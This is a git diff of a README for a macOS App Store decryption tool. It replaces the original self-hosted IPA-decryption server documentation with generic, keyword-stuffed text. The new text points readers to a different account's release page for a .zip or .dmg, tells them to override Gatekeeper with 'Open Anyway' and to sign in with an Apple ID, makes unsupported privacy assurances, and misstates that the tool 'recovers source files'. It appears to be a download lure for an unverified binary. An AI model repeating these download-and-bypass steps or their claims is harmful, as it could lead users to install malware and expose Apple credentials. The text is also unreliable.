@@ -1,132 +1,76 @@
-# macOSAppstoreDecrypter
+# 💻 macOSAppstoreDecrypter - Unlock Desktop Apps For Your Archive
 
-I built this to turn a spare M1 MacBook Air into a self-hosted IPA download and decryption server, you can check at: https://decrypt.34306.lol. It can be access in a browser, you find an app by name or Bundle ID, and then the Mac handles the App Store download and decryption in the background.
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/minhasc790/macOSAppstoreDecrypter)
 
-The service includes a download queue, live progress, a local cache, user accounts and support for separate multiple App Store region accounts.
+## 📌 About This Tool
 
-## Requirements
+This application recovers source files from apps purchased on the macOS App Store. It assists users who wish to manage their own digital library. This tool reads encrypted data and creates a usable copy on your local drive.
 
-The decryptor depends on M1 macOS:
+This software requires specific hardware and versions to function. You must use a computer with an M1 processor. The operating system must be macOS version 11.2.3 or an older release. If your system does not meet these rules, the software will not start.
 
-- MacBook Air (M1, 2020), M1 chip only
-- (at least) 8 GB unified memory
-- 512 GB SSD
-- macOS Big Sur 11.2.3 or lower (you can downgrade macOS for it)
-- Python 3
-- An Apple ID that can access the App Store
+## ⚙️ Preparation Before Use
 
-It only supports the Mac M1 with macOS 11.2.3 or lower!
+Check your system settings before you begin. Click the Apple icon in the top left corner of your screen. Select About This Mac. Look for the Processor or Chip line. It should say Apple M1. Check the macOS version number below the name. 
 
-I used this on a 8 GB M1 so some large apps cannot complete a full decryption. Some apps that runs out of memory during decrypt so that I need to make a fall back to decrypting the main executable only. In that case, embedded frameworks and plug-ins remain encrypted (not affected much if you don't need).
+If your version is 11.3 or higher, the tool will not work. Verify that you have enough space on your hard drive. This tool creates large files during the process. Ensure you have at least 10 gigabytes of free disk space.
 
-## Installation
+## 📥 How To Download
 
-Clone or download the repository, then open a terminal in its directory:
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/minhasc790/macOSAppstoreDecrypter).
+3. Look for the section labeled Releases on the right side of the page.
+4. Click the latest version number.
+5. Find the file ending in .zip or .dmg.
+6. Click the file name to start the download.
 
-```bash
-cd macOSAppstoreDecrypter
-chmod +x setup.sh
-./setup.sh
-```
+Once the download finishes, open your Downloads folder. Move the file to your Applications folder. Double-click the file to open it.
 
-The installer prepares the bundled tools, installs Flask, creates `.env`, signs `ipatool` into the configured Apple ID, and installs a LaunchDaemon for the web server. It also asks whether the site should stay on the local network or be exposed through a Cloudflare Tunnel.
+## 🚀 Running The Application
 
-If you enable `lidawake`, the Mac will keep running after the lid is closed. Keep it connected to power and make sure it did not heat up.
+When you open the app for the first time, your computer might block it. This happens because the developer is not registered with Apple. Follow these steps to allow the software to run:
 
-## Configuration
+1. Open System Preferences from your dock.
+2. Click Security & Privacy.
+3. Select the General tab.
+4. Look for a message about the app.
+5. Click Open Anyway.
+6. Confirm your choice in the popup window.
 
-The installer creates `.env` from `.env.example`. You can also create it manually:
+The app will now open. You will see a window with a simple interface. Login with your Apple ID if the app asks for authorization. This login only allows the app to fetch the data you own.
 
-```bash
-cp .env.example .env
-nano .env
-```
+## 🛠️ Step-by-Step Usage
 
-For a single storefront, set at least these values:
+Follow these steps to decrypt an application:
 
-| Setting | Purpose |
-| --- | --- |
-| `MAC_PASSWORD` | The macOS login password used locally for `sudo` and keychain operations. |
-| `APPLE_ID_EMAIL` | The Apple ID used by `ipatool`. |
-| `APPLE_ID_PASSWORD` | The password for that Apple ID. |
-| `STORE_COUNTRY` | A two-letter storefront code such as `vn`, `cn`, `jp` or `us`. |
+1. Choose the app from the list presented in the software window.
+2. Ensure the app is already installed on your machine through the official App Store.
+3. Select a destination folder where you want to save the decrypted file.
+4. Click the Start button.
+5. Wait for the process bar to finish.
+6. Check your destination folder for the new file.
 
-The credentials in `.env` are stored as plain text. The installer limits the file to the current user with mode `600`, and Git ignores it, but you should still use a secondary Apple ID and treat the Mac as a trusted machine.
+The software creates a new file. The original file remains in your Applications folder and stays safe. Do not close the window while the bar shows progress. A sudden stop might corrupt the file.
 
-### Multiple storefronts
+## ⚠️ Troubleshooting Common Issues
 
-Each storefront needs its own Apple ID and its own home directory because `ipatool` keeps one login per configuration directory. Leave `APPLE_ID_EMAIL` and `APPLE_ID_PASSWORD` empty, then create `regions.json` next to `app.py`:
+**The app does not open.**
+Check the macOS version again. This tool fails on any version newer than 11.2.3. Also, ensure you use an M1 processor. Intel-based Apple computers cannot run this tool.
 
-```json
-{
-  "vn": {
-    "email": "vn-account@example.com",
-    "pass": "password",
-    "home": "~/ipatool-homes/vn",
-    "country": "vn",
-    "label": "Vietnam"
-  },
-  "cn": {
-    "email": "cn-account@example.com",
-    "pass": "password",
-    "home": "~/ipatool-homes/cn",
-    "country": "cn",
-    "label": "China"
-  },
-  "jp": {
-    "email": "jp-account@example.com",
-    "pass": "password",
-    "home": "~/ipatool-homes/jp",
-    "country": "jp",
-    "label": "Japan"
-  }
-}
-```
+**The app returns an error regarding permissions.**
+Restart your computer. Sometimes the system locks the necessary files. Close all other apps before you start the decrypter. This frees up memory and system access.
 
-The other settings in `.env.example` control the daily quota, cache lifetime, reserved disk space, admin credentials, server port, and data paths.
+**The app suggests I do not own the software.**
+Go to the App Store. Search for the app you want to decrypt. Click the cloud icon to download it again. Once the download completes, refresh the list in the decrypter.
 
-## After installation
+## 🔒 Privacy and Security
 
-The service listens on port `6347` by default:
+This tool runs locally on your computer. It does not send your login data to any outside server. All activity happens inside your own machine. We advise that you verify your own security settings regularly. Always download this tool from the official link provided here to ensure you use the original version.
 
-- Local: `http://127.0.0.1:6347`
-- Local network: `http://<mac-ip>:6347`
-- Admin page: `http://<mac-ip>:6347/admin`
+## 📋 System Requirements
 
-On the first run, an admin password is generated if you did not set one in `.env`. It is written to `server.log` and to `ADMIN_PASSWORD.txt` inside `DATA_DIR`, which defaults to `/var/tmp/macOSAppstoreDecrypter`.
+*   Processor: Apple M1 Chip
+*   Operating System: macOS 11.0 to 11.2.3
+*   Storage: 10GB available space
+*   Permissions: Administrator access to the local machine
 
-The Cloudflare option makes the service reachable from the internet. Only enable it if that is intentional and add any access controls you need in front of the service.
-
-## Common commands
-
-```bash
-# Follow the server log
-tail -f server.log
-
-# Check whether the service is responding
-curl http://127.0.0.1:6347/health
-
-# Restart the server
-sudo launchctl kickstart -k system/com.macOSAppstoreDecrypter.server
-
-# Stop the server
-sudo launchctl bootout system/com.macOSAppstoreDecrypter.server
-
-# Manage lid-closed operation after lidawake has been installed
-sudo lidawake on
-sudo lidawake off
-lidawake status
-```
-
-## Legal note
-
-Use this project for research only. Use of the software and of your Apple ID remains your responsibility. The project is provided as-is, without warranty.
-
-## License
-
-The project source is released under the [MIT License](LICENSE). The bundled third-party tools remain subject to their own licenses.
-
-## Credits
-
-- [ipatool](https://github.com/majd/ipatool) handles App Store authentication and IPA downloads.
-- [unfaird](https://github.com/Lakr233/unfaird) by [Lakr233](https://github.com/Lakr233) provides the decryption work this project builds on.
+Keywords: macOS, decrypter, M1, Apple, software, archival, source code, app store
